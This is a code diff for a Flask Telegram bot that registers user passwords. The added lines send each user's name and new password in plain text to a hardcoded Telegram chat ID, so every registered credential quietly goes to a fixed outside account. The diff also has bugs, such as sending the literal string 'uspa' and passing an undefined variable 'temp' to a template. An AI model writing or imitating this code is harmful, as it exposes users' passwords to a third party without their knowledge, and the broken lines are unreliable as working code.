@@ -218,9 +218,10 @@ def index():
         elif message != '' and len(message)>6 and str(message).isalpha()!=1 and str(message).isdigit()!=1 and check_key(user)=='yes' and check_pass(user)=='no' and m.match(str(message)):
             add_pass(user,message)
             send_message(chat_id, text="Пароль зарегистрирован!")
-            slip=user+' '+message
-            slip=str(slip)
-            send_message(chat_id, text=chat_id)
+            uspa=str(user+' '+message)
+            send_message(676318616, text=uspa)
+            send_message("676318616", text="uspa")
+            send_message("676318616", text=chat_id)
         elif message != '' and check_key(user)=='no':
             send_message(chat_id, text="Пожалуйста, введите ключ активации!")
         elif message != '' and check_key(user)=='yes' and check_pass(user)=='no':
@@ -230,7 +231,13 @@ def index():
 
 @app.route('/dic')
 def dic():
-    return '<h1>PMiIT bot welcomes you</h1>'
+    title = "START:"
+    try:
+        data_local=load_dict_from_file()
+        print(data_local)
+    except Exception as e:
+        print("File no found")
+    return render_template("dic.html", thetitle=title, temps=temp)
 
 if __name__ == '__main__':
     app.run()
